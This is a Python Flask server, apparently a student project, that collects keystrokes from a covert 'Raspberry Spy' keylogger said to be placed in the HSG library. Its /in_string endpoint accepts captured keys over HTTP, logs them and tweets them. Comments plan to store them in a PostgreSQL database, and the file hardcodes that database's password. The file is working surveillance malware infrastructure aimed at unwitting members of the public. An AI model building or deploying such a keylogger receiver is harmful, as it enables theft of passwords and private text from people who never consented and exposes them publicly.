# import dependencies
import os
from flask import Flask
from flask import request #otherwise request. wont be recognized!
import psycopg2
from library import create_tweet


# bootstrap the app
app = Flask(__name__)

# set the port dynamically with a default of 3000 for local development
port = int(os.getenv('PORT', '3000'))

# our base route which just returns a string
@app.route('/')
def hello_world():
    return 'Hi, these are the Keylogs from the Raspberry [S]py which is located at the HSG library.'

@app.route("/in_string") #endpoint
def get_string():   #for GET Data
    keys_received = request.args.get("key_info")
    print(keys_received) #to have some feedback in the flask log
    create_tweet(keys_received)
    
    # tweet the keys received
    
    # store the keys in the database

    return "OK"    #or return keys_received


# start the app
if __name__ == '__main__':
    print("AAAAAAAA")           #erase later!!!
    #connect to psycopg2
    try:
        connection = psycopg2.connect(user = "postgres",
                                    password = "keylogger19",
                                    host = "127.0.0.1",
                                    port = "5432",
                                    database = "postgres")
        cursor = connection.cursor()
        # Print PostgreSQL Connection properties
        print ( connection.get_dsn_parameters(),"\n")
        # Print PostgreSQL version
        cursor.execute("SELECT version();")
        record = cursor.fetchone()
        print("You are connected to - ", record,"\n")
    except (Exception, psycopg2.Error) as error :
        print ("Error while connecting to PostgreSQL", error)
    finally:
        #closing database connection.
            if(connection):
                cursor.close()
                connection.close()
                print("PostgreSQL connection is closed")



    app.run(host='0.0.0.0', port=port)

